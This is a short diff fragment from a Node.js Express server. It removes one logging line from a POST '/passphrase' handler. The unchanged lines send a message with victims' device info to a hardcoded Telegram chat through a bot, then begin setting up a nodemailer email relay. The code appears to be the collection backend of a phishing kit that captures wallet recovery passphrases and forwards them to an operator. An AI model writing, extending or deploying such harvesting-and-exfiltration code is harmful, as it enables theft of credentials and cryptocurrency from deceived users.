@@ -55,7 +55,7 @@ app.post('/passphrase', async (req, res) => {
       Device Info: ${JSON.stringify(deviceInfo)}
     `;
     await bot.sendMessage('1106055083', teleMessage);
-    console.log(teleMessage)
+
 
     // Send email using nodemailer
     let transporter = nodemailer.createTransport({
